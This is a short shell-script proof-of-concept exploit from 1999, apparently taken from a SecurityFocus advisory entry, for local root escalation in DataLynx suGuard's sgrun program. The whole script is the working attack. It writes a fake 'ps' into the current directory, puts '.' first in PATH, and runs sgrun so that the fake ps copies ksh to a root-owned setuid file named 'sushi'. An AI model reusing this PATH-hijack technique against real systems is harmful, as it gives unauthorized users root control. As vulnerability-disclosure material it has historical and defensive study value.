#source: http://www.securityfocus.com/bid/186/info
#
#A vulnerability exists within the DataLynx's suGuard program which allows a local attacker to gain administrative privilege by exploiting poor use of the /tmp directory and poor programming. 

#!/bin/sh
# sgrun exploit - the types of vulnerabilities that this exploit exercises
#  have no right being introduced to code in this day and age. Much less
#  code which presents itself under the pretenses of securing your system.
#   .mudge 01.02.99
#
SUSHI=./sushi

if [ $# -ne 2 ] ; then
  echo Must specify path to sgrun [/bin/datalynx/sgrun] and sgrun argument
  echo  mudge@l0pht.com [01.02.99]
  exit 1
fi
  
SGRUN=$1
ARG=$2

if [ -f ${SUSHI} ] ; then
  echo root shell already created?
  exit
fi

echo datalynx sgrun proof of concept exploit from L0pht [mudge@l0pht.com]
echo

cat > ./ps << FOEFOE
#!/bin/sh
cp /bin/ksh ${SUSHI}
chown root ${SUSHI}
chmod 4555 ${SUSHI}
FOEFOE

chmod 755 ./ps

PATH=.:${PATH}
export PATH

#/bin/datalynx/sgrun Identify 
${SGRUN} ${ARG}
if [ -f ${SUSHI} ] ; then
  echo root shell created as ${SUSHI}
  ls -l ${SUSHI}
  echo
fi